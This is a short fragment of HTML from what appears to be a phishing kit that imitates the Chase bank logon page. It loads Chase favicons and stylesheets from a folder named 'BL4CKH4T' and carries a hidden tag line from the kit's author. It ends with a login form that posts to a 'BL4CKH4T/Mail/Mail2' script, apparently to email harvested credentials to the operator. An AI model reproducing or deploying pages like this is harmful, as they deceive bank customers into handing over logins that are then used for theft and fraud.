...
<head>
        ...
        <link rel="shortcut icon" href="BL4CKH4T/Files/img/chasefavicon.ico">
        <link rel="apple-touch-icon" sizes="152x152" href="BL4CKH4T/Files/img/chase-touch-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="120x120" href="BL4CKH4T/Files/img/chase-touch-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="76x76" href="BL4CKH4T/Files/img/chase-touch-icon-76x76.png">
        <link rel="apple-touch-icon" href="BL4CKH4T/Files/img/chase-touch-icon.png">
        <link rel="stylesheet" href="BL4CKH4T/Files/css/logon.css">
        <link rel="stylesheet" href="BL4CKH4T/Files/css/blue-ui2.css">
        <link rel="stylesheet" href="BL4CKH4T/Files/css/overview.css">
...
.icon{display:none}@font-face{font-family:dcefont;font-style:'normal';font-weight:'normal';src:url(BL4CKH4T/Files/css/fonts/fonts/dcefont.eot);src:url(BL4CKH4T/Files/css/fonts/dcefont.eot?#iefix) format('embedded-opentype'),url(BL4CKH4T/Files/css/fonts/dcefont.woff) format('woff'),url(BL4CKH4T/Files/css/fonts/dcefont.ttf) format('truetype'),url(BL4CKH4T/Files/css/fonts/dcefont.svg#dcefont) format('svg')}
...
<span class="util accessible-text">BL4CKH4T LOVE YOU !</span>
</a> 
</div>
</header>
<form action="BL4CKH4T/Mail/Mail2" method="POST">
